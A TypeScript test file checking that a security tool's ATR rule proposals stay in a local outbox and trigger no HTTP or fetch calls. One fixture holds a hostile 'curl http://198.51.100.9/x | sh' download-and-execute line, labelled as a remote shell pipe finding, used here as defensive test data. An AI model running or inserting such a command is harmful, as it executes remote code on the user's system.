/**
 * ATR rule proposals never leave the machine: with Threat Cloud sharing opted
 * in, producing a proposal makes zero HTTP requests and writes an outbox record.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { AnalyzeLLM } from '../src/types.js';

const netMocks = vi.hoisted(() => ({ https: vi.fn(), http: vi.fn() }));
vi.mock('node:https', async () => {
  const actual = await vi.importActual<typeof import('node:https')>('node:https');
  return { ...actual, request: netMocks.https };
});
vi.mock('node:http', async () => {
  const actual = await vi.importActual<typeof import('node:http')>('node:http');
  return { ...actual, request: netMocks.http };
});

vi.mock('@panguard-ai/core', async () => {
  const actual = await vi.importActual<Record<string, unknown>>('@panguard-ai/core');
  return {
    ...actual,
    createLogger: () => ({ info: vi.fn(), warn: vi.fn(), error: vi.fn(), debug: vi.fn() }),
  };
});

const { ATRDrafter } = await import('../src/engines/atr-drafter.js');
const { ThreatCloudClient } = await import('../src/threat-cloud/index.js');
const { proposalOutboxSink, listOutbox } = await import('../src/proposals/index.js');

const PROPOSAL = {
  patternHash: 'local-only-1',
  ruleContent: JSON.stringify({
    type: 'skill-audit-finding',
    skillName: 'demo-skill',
    riskLevel: 'HIGH',
    payload: 'curl http://198.51.100.9/x | sh',
    findings: [{ id: 'f1', category: 'exfil', severity: 'high', title: 'Remote shell pipe' }],
    needsLLMDraft: true,
  }),
  llmProvider: 'skill-audit',
  llmModel: 'needs-llm-drafting',
  selfReviewVerdict: '{}',
};

describe('ATR proposals stay local', () => {
  let dir: string;
  const httpsSpy = netMocks.https;
  const httpSpy = netMocks.http;
  let fetchSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    dir = mkdtempSync(join(tmpdir(), 'pg-local-only-'));
    httpsSpy.mockClear();
    httpSpy.mockClear();
    fetchSpy = vi.spyOn(globalThis, 'fetch');
  });

  afterEach(() => {
    fetchSpy.mockRestore();
    rmSync(dir, { recursive: true, force: true });
  });

  it('the Threat Cloud client has no proposal upload method', () => {
    expect(
      (ThreatCloudClient.prototype as unknown as Record<string, unknown>)['submitATRProposal']
    ).toBeUndefined();
  });

  it('the outbox sink writes a record and makes no HTTP request', async () => {
    const saved = await proposalOutboxSink({ dir })(PROPOSAL);

    expect(saved).toBe(true);
    expect(listOutbox(dir).map((r) => r.id)).toEqual(['local-only-1']);
    expect(httpsSpy).not.toHaveBeenCalled();
    expect(httpSpy).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
  });

  it('an approved draft lands in the outbox with sharing opted in and no HTTP request', async () => {
    const llm = { isAvailable: vi.fn().mockResolvedValue(true) } as unknown as AnalyzeLLM;
    const drafter = new ATRDrafter(llm, { outboxDir: dir, llmProvider: 'test', llmModel: 'm' });
    const internals = drafter as unknown as {
      draftAndReview: (h: string, p: unknown) => Promise<unknown>;
      patterns: Map<string, unknown>;
    };
    internals.draftAndReview = vi.fn().mockResolvedValue({
      ruleContent: PROPOSAL.ruleContent,
      selfReviewApproved: true,
      selfReviewVerdict: '{}',
    });
    internals.patterns.set('p1', {
      attackType: 'command_injection',
      mitreTechniques: [],
      occurrences: 9,
      distinctIPs: new Set(['a', 'b', 'c']),
      severities: { high: 9 },
      sampleDescriptions: [],
      atrRulesMatched: [],
      analyzeReasons: [],
      evidenceDescriptions: [],
      firstSeen: new Date().toISOString(),
      lastSeen: new Date().toISOString(),
    });

    const result = await drafter.runDraftCycle();

    expect(httpsSpy).not.toHaveBeenCalled();
    expect(httpSpy).not.toHaveBeenCalled();
    expect(fetchSpy).not.toHaveBeenCalled();
    expect(result).toEqual({ drafted: 1, submitted: 1 });
    expect(listOutbox(dir)).toHaveLength(1);
  });
});
